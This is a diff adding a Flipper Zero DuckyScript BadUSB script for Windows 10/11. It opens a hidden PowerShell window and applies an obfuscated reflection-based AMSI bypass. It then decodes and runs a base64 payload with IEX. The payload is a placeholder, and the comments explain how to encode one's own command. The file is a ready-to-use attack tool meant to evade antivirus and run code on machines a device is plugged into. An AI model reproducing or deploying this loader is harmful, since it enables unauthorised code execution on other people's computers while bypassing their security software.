@@ -1,0 +1,19 @@
+﻿REM ============================================================================
+REM  FLLC - BadUSB: Obfuscated PowerShell Loader
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time: ~5 seconds
+REM  Uses string obfuscation to bypass AMSI and basic AV detection
+REM  Ref: BC-SECURITY/Beginners-Guide-to-Obfuscation
+REM ============================================================================
+REM  CUSTOMIZE: Replace the base64 encoded command with your payload
+REM  Generate with: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('YOUR_COMMAND'))
+REM ============================================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoP -C "$a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');$b=$a.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$b.SetValue($null,$true);IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64_PAYLOAD_HERE')))"
+ENTER
+DELAY 500
